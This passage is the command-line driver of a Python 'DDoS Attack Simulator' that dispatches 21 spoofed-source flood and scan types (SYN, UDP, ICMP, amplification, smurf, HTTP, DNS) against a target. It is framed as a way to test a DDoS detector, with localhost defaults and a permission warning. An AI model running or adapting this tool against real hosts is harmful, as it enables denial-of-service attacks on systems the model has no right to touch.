        ("Fragment Flood", lambda: fragment_flood(target_ip, num_sources//4, 5, delay*3)),
        ("Burst Attack", lambda: burst_attack(target_ip, target_port, num_sources//4, 3, 20, delay/2)),
        ("HTTP Flood", lambda: http_flood(target_ip, target_port, num_sources//4, 10, delay*2)),
        ("DNS Flood", lambda: dns_flood(target_ip, num_sources//4, 10, delay*2)),
    ]
    
    total_packets = 0
    for name, attack_func in attacks:
        print(f"\n{'='*70}")
        print(f"Attack {attacks.index((name, attack_func)) + 1}/{len(attacks)}: {name}")
        print(f"{'='*70}\n")
        try:
            result = attack_func()
            total_packets += result.get('packets_sent', 0)
        except Exception as e:
            print(f" {name} failed: {e}")
        time.sleep(1)  # Brief pause between attacks
    
    print("\n" + "=" * 70)
    print(f"ALL ATTACKS COMPLETE - Total packets sent: {total_packets}")
    print("=" * 70)


# MAIN FUNCTION

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='ENHANCED DDoS Attack Simulator - All 21 Attack Types',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types (21 total):
  ORIGINAL:
    syn        - Distributed SYN flood
    udp        - Distributed UDP flood
    icmp       - Distributed ICMP flood (ping flood)
    lowslow    - Low-and-slow attack
    spike      - Sudden spike of new IPs
    multi      - Multi-vector attack (SYN+UDP+ICMP+ACK+HTTP)

  TCP FLAG ATTACKS (Feature 1):
    ack        - ACK flood attack
    fin        - FIN flood attack
    rst        - RST flood attack
    xmas       - XMAS scan (FIN+PSH+URG - malformed)
    null       - NULL scan (no flags - malformed)
    invalid    - Invalid flag combinations (SYN+FIN)

  PACKET SIZE (Feature 2):
    smallpkt   - Small packet flood
    amplify    - Amplification attack (large packets)

  ICMP TYPES (Feature 3):
    smurf      - Smurf attack simulation (ICMP replies)

  PORT ANALYSIS (Feature 4):
    portscan   - Distributed port scanning

  TTL ANALYSIS (Feature 5):
    ttlspoof   - TTL spoofing attack

  FRAGMENT (Feature 6):
    fragment   - IP fragmentation flood

  BURST (Feature 8):
    burst      - Micro-burst attack

  APP LAYER (Feature 10):
    http       - HTTP flood
    dns        - DNS query flood

  COMPREHENSIVE:
    all        - Run ALL attack types sequentially

Examples:
  # Multi-vector attack (most comprehensive single attack)
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type multi

  # XMAS scan attack (malformed packets)
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type xmas --sources 100

  # TTL spoofing to test spoofed traffic detection
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type ttlspoof

  # Run ALL 21 attack types for comprehensive testing
  sudo python3 simulate_ddos.py --target 127.0.0.1 --type all
        """
    )
    
    all_types = ['syn', 'udp', 'icmp', 'lowslow', 'spike', 'multi',
                 'ack', 'fin', 'rst', 'xmas', 'null', 'invalid',
                 'smallpkt', 'amplify', 'smurf', 'portscan', 
                 'ttlspoof', 'fragment', 'burst', 'http', 'dns', 'all']
    
    parser.add_argument('--target', '-t', default=DEFAULT_ATTACK_TARGET,
                       help=f'Target IP address (default: {DEFAULT_ATTACK_TARGET})')
    parser.add_argument('--type', '-T', choices=all_types, default='multi',
                       help='Attack type (default: multi)')
    parser.add_argument('--port', '-p', type=int, default=DEFAULT_ATTACK_PORT,
                       help=f'Target port (default: {DEFAULT_ATTACK_PORT})')
    parser.add_argument('--sources', '-s', type=int, default=DEFAULT_DDOS_SOURCES,
                       help=f'Number of spoofed source IPs (default: {DEFAULT_DDOS_SOURCES})')
    parser.add_argument('--packets', '-n', type=int, default=10,
                       help='Packets per source IP (default: 10)')
    parser.add_argument('--delay', '-d', type=float, default=DEFAULT_PACKET_DELAY,
                       help=f'Delay between packets (default: {DEFAULT_PACKET_DELAY})')
    
    args = parser.parse_args()
    
    print_banner()
    
    print("  WARNING: This is a DDoS simulation tool for testing purposes only!")
    print("   Only use on systems you own or have explicit permission to test.")
    print()
    print(f"Attack Configuration:")
    print(f"  Type:       {args.type.upper()}")
    print(f"  Target:     {args.target}:{args.port}")
    print(f"  Sources:    {args.sources} spoofed IPs")
    print(f"  Packets:    {args.packets} per source")
    print()
    
    try:
        response = input("Continue with DDoS simulation? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("Attack cancelled.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAttack cancelled.")
        sys.exit(0)
    
    print()
    
    # Execute attacks based on type
    attack_map = {
        'syn': lambda: distributed_syn_flood(args.target, args.port, args.sources, args.packets, args.delay),
        'udp': lambda: distributed_udp_flood(args.target, args.port, args.sources, args.packets, 512, args.delay),
        'icmp': lambda: distributed_icmp_flood(args.target, args.sources, args.packets, args.delay),
        'lowslow': lambda: low_and_slow_attack(args.target, args.port, args.sources, 40, args.delay * 10),
        'spike': lambda: sudden_spike_attack(args.target, args.port, args.sources, 2.0),
        'multi': lambda: coordinated_multi_vector(args.target, args.port, args.sources, 10.0),
        'ack': lambda: ack_flood(args.target, args.port, args.sources, args.packets, args.delay),
        'fin': lambda: fin_flood(args.target, args.port, args.sources, args.packets, args.delay),
        'rst': lambda: rst_flood(args.target, args.port, args.sources, args.packets, args.delay),
        'xmas': lambda: xmas_scan(args.target, args.port, args.sources, args.packets, args.delay * 5),
        'null': lambda: null_scan(args.target, args.port, args.sources, args.packets, args.delay * 5),
        'invalid': lambda: invalid_flags_attack(args.target, args.port, args.sources, args.packets, args.delay * 5),
        'smallpkt': lambda: small_packet_flood(args.target, args.port, args.sources, args.packets * 2, args.delay / 2),
        'amplify': lambda: amplification_attack(args.target, 53, args.sources, args.packets, 1200, args.delay * 2),
        'smurf': lambda: smurf_simulation(args.target, args.sources, args.packets, args.delay),
        'portscan': lambda: port_scan_attack(args.target, args.sources // 5, 30, args.delay * 5),
        'ttlspoof': lambda: ttl_spoofing_attack(args.target, args.port, args.sources, args.packets, args.delay),
        'fragment': lambda: fragment_flood(args.target, args.sources, args.packets, args.delay * 3),
        'burst': lambda: burst_attack(args.target, args.port, args.sources, 5, 30, args.delay / 2),
        'http': lambda: http_flood(args.target, args.port, args.sources, args.packets * 2, args.delay * 2),
        'dns': lambda: dns_flood(args.target, args.sources, args.packets * 2, args.delay * 2),
        'all': lambda: run_all_attacks(args.target, args.port, args.sources, args.delay),
    }
    
    if args.type in attack_map:
        attack_map[args.type]()
    
    print()
    print("=" * 70)
    print(" Check your DDoS detector for alerts!")
    print("   The ENHANCED detector should identify:")
    print("   - Multiple source IPs and aggregate traffic")
    print("   - TCP flag attacks (ACK/FIN/RST/XMAS/NULL/Invalid)")
    print("   - Packet size anomalies (small floods, amplification)")
    print("   - ICMP type attacks (ping floods, smurf indicators)")
    print("   - Port scanning behavior")
    print("   - TTL anomalies (spoofing indicators)")
    print("   - Fragmentation attacks")
    print("   - Micro-burst patterns")
    print("   - Application layer floods (HTTP, DNS)")
    print("=" * 70)


if __name__ == "__main__":
    # Check if running as root
    if os.name == 'nt':
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(" This script requires Administrator privileges on Windows.")
            sys.exit(1)
    else:
        if os.geteuid() != 0:
            print(" This script requires root privileges to spoof IP addresses.")
            print(f"   Please run with sudo: sudo python3 {sys.argv[0]}")
            sys.exit(1)
    
    main()
